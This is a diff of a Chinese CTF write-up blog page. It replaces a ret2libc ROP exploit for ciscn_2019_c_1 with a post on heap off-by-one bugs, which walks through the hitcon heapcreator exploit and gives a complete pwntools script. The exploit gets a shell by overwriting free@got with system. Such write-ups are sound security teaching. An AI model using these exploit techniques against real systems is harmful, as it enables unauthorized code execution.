@@ -16,23 +16,30 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="exp">
+    <meta name="description" content="堆中的 off-by-one 漏洞, hitcon_heapcreator exp">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ROP ciscn_2019_c_1">
-<meta property="og:url" content="https://isolator-1.github.io/2022/11/16/ROP%20ciscn_2019_c_1/index.html">
+<meta property="og:title" content="Off-By-One">
+<meta property="og:url" content="https://isolator-1.github.io/2022/11/27/Off-By-One/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="exp">
+<meta property="og:description" content="堆中的 off-by-one 漏洞, hitcon_heapcreator exp">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-11-16T11:07:00.000Z">
-<meta property="article:modified_time" content="2022-11-28T04:33:16.332Z">
+<meta property="og:image" content="https://isolator-1.github.io/img/off_by_one/1.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/off_by_one/2.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/off_by_one/3.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/off_by_one/4.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/off_by_one/5.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/off_by_one/6.jpg">
+<meta property="article:published_time" content="2022-11-27T11:00:00.000Z">
+<meta property="article:modified_time" content="2022-11-28T05:31:07.414Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
 <meta property="article:tag" content="exp">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/off_by_one/1.png">
   
   
   
-  <title>ROP ciscn_2019_c_1 - Isolator&#39;s Blog</title>
+  <title>Off-By-One - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -197,7 +204,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="ROP ciscn_2019_c_1"></span>
+            <span id="subtitle" data-typed-text="Off-By-One"></span>
           
         </div>
 
@@ -208,8 +215,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-16 19:07" pubdate>
-          November 16, 2022 pm
+        <time datetime="2022-11-27 19:00" pubdate>
+          November 27, 2022 pm
         </time>
       </span>
     
@@ -220,7 +227,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k words
+          2.6k words
         
       </span>
     
@@ -231,7 +238,7 @@
         
         
         
-          12 mins
+          22 mins
         
       </span>
     
@@ -269,15 +276,63 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">ROP ciscn_2019_c_1</h1>
+            <h1 style="display: none">Off-By-One</h1>
             
             
               <div class="markdown-body">
                 
-                <p><strong>题目</strong></p>
-<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_c_1">https://buuoj.cn/challenges#ciscn_2019_c_1</a></p>
-<p><strong>Exp</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,29563) </span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>ret=<span class="hljs-number">0x4006b9</span><br>rdi=<span class="hljs-number">0x400c83</span><br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment">#第一次攻击绕过函数</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br> <br> <br> <br>p.recvline()	<span class="hljs-comment">#接收字符串Ciphertext</span><br>p.recvline()    <span class="hljs-comment">#加密后的密文</span><br><span class="hljs-comment">#这里注意需要接收2次</span><br> <br>puts_addr=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))  <span class="hljs-comment">#得到 puts 函数 的地址</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr) <span class="hljs-comment">#获取libc的版本</span><br>offset=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>) <span class="hljs-comment">#计算偏移量</span><br>binsh=offset+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>) <span class="hljs-comment">#计算字符串&quot;/bin/sh&quot;的地址</span><br>system=offset+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-comment">#计算函数system的地址</span><br> <br><span class="hljs-comment">#第二次攻击getshell</span><br> <br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)     <span class="hljs-comment">#   再一次执行 一遍流程</span><br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br>p.interactive()<br><br><br><br><span class="hljs-comment"># ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</span><br><span class="hljs-comment"># https://www.cnblogs.com/ZIKH26/articles/15996874.html</span><br></code></pre></td></tr></table></figure>
+                <h4 id="Off-By-One漏洞如何产生"><a href="#Off-By-One漏洞如何产生" class="headerlink" title="Off-By-One漏洞如何产生"></a>Off-By-One漏洞如何产生</h4><ol>
+<li><p>循环多一次</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C">x = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">10</span>;i++)<br>&#123;<br>    x[i] = getchar();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>x的下一个chunk第一个字节被溢出了</p>
+</li>
+<li><p><code>strlen</code>和<code>strcpy</code>行为不一致</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">100</span>)<br>&#123;<br>    <span class="hljs-built_in">strcpy</span>(chunk,buffer);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>strlen</code>返回值不算结束符’<code>\0</code>，而<code>strcpy</code>复制时会把结束符在内的101个字符复制过去</p>
+</li>
+</ol>
+<h4 id="hitcon-creator"><a href="#hitcon-creator" class="headerlink" title="hitcon_creator"></a>hitcon_creator</h4><h5 id="1-create"><a href="#1-create" class="headerlink" title="1. create"></a>1. create</h5><p><img src="/img/off_by_one/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>从上述结构可以推断出heaparray是如下结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heaparray_item</span>&#123;</span><br>    int_64   size;<br>    <span class="hljs-type">char</span> * content;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heaparray_item</span> * <span class="hljs-title">heaparray</span>[10];</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="2-edit"><a href="#2-edit" class="headerlink" title="2. edit"></a>2. edit</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ( *(&amp;heaparray + v1) )<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content of heap : &quot;</span>);<br>    read_input(*((_QWORD *)*(&amp;heaparray + v1) + <span class="hljs-number">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class="hljs-number">1LL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done !&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>read_input</code>读取size+1字节，出现了off_by_one漏洞</p>
+<p>可以覆盖下一个chunk的size字段</p>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ol>
+<li><p>申请三个堆块，大小为0x18,0x10,0x10，加上三次size申请的0x10，一共6个chunk</p>
+<p> <img src="/img/off_by_one/2.jpg" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>修改0号块，写入<code>/bin/sh</code>，然后再溢出<code>0x81</code>到下一个chunk的size</p>
+<p><img src="/img/off_by_one/3.jpg" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>这时delete chunk 1，会合并到前一个chunk（也就是1的size所在chunk）中</p>
+<p> <img src="/img/off_by_one/4.jpg" srcset="/img/loading.gif" lazyload></p>
+<p> 观察bins，发现这个chunk被free到fastbin的0x80节点上（0x20上也有一个chunk是因为delete也会将size释放掉）</p>
+<p> <img src="/img/off_by_one/5.jpg" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>申请一个新的chunk，将0x80这个块申请出来，因此malloc的大小需要为0x70</p>
+<p> 同时，在2号的content位置写入<code>free@got</code></p>
+<p> 这时调用show(2)会泄露free的地址</p>
+<p> <img src="/img/off_by_one/6.jpg" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>泄露libc基址找到system地址</p>
+</li>
+<li><p><code>edit(2,p64(system_addr))</code>时，会修改content指针指向的内容，而content指针被<code>free@got</code>替换掉了，所以free的got表被修改成了<code>system@got</code>上的地址</p>
+</li>
+<li><p>然后<code>delete(0)</code>时，首先要free掉<code>heaparray[0].content</code>上的内容，但是由于free被替换成了system，结果就变成了以content指针为参数调用system函数的情况，而<code>heaparray[0].content</code>恰好是之前写过的<code>/bin/sh</code>，因此执行了`system(‘/bin/sh’)</p>
+</li>
+</ol>
+<h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><blockquote>
+<p>libcsearcher挑版本为2.23的</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><span class="hljs-comment">#r = remote(&#x27;node4.buuoj.cn&#x27;,26117)</span><br>elf = ELF(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    r.sendlineafter(<span class="hljs-string">&quot;heap:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    r.sendlineafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x81&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>add(<span class="hljs-number">0x70</span>,p64(<span class="hljs-number">1</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x8</span>)+p64(free_got))<br>show(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>free_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#libc</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,free_addr)<br>offset = free_addr-libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>system_addr = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>edit(<span class="hljs-number">2</span>,p64(system_addr))<br><span class="hljs-comment">#gdb.attach(r)</span><br>delete(<span class="hljs-number">0</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+
                 
               </div>
             
@@ -303,8 +358,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>ROP ciscn_2019_c_1</div>
-      <div>https://isolator-1.github.io/2022/11/16/ROP ciscn_2019_c_1/</div>
+      <div>Off-By-One</div>
+      <div>https://isolator-1.github.io/2022/11/27/Off-By-One/</div>
     </div>
     <div class="license-meta">
       
@@ -316,7 +371,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>November 16, 2022</div>
+          <div>November 27, 2022</div>
         </div>
       
       
@@ -348,18 +403,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/11/18/heap%20exploitation/" title="Heap Exploitation">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Heap Exploitation</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/11/16/HarekazeCTF2019baby_rop/" title="HarekazeCTF2019 baby_rop">
-                        <span class="hidden-mobile">HarekazeCTF2019 baby_rop</span>
+                      <a href="/2022/11/27/patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8Flibc%E7%89%88%E6%9C%AC/" title="patchelf修改libc版本">
+                        <span class="hidden-mobile">patchelf修改libc版本</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
